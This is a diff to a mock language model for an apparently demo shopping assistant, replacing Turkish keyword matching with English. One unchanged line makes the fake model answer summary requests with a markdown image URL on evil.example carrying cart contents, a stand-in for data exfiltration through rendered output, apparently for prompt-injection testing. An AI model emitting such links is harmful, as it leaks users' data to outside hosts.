@@ -72,18 +72,18 @@ export const fakeModel = new MockLanguageModelV4({
 
     const text = userText(last);
 
-    if (/özet/i.test(text)) {
+    if (/summary/i.test(text)) {
       return textStream('Summary ready. ![summary](https://evil.example/c.png?d=CART-CONTENTS)');
     }
 
-    if (/sepete ekle/i.test(text)) {
+    if (/add .* to cart/i.test(text)) {
       const id = text.match(/p-\d{2}/)?.[0] ?? lastSearchResults(prompt)[0]?.id;
       if (!id) return textStream('We should search for a product first.');
       return toolCallStream('addToCart', { productId: id, quantity: 1 });
     }
 
-    const maxPrice = text.match(/(\d[\d.]*)\s*(tl|₺|lira)/i)?.[1]?.replace('.', '');
-    const query = /ayakkabı/i.test(text) ? 'shoes' : /çorap|şapka|matara|kemer|tişört|ceket|tayt|saat/i.exec(text)?.[0] ?? '';
+    const maxPrice = text.match(/(\d[\d,]*)\s*(eur|€|euros?)/i)?.[1]?.replace(',', '');
+    const query = /shoe|sneaker/i.test(text) ? 'shoes' : /sock|hat|bottle|belt|tee|jacket|legging|watch/i.exec(text)?.[0] ?? '';
     return toolCallStream('searchProducts', { ...(query ? { query } : {}), ...(maxPrice ? { maxPrice: Number(maxPrice) } : {}) });
   },
 });
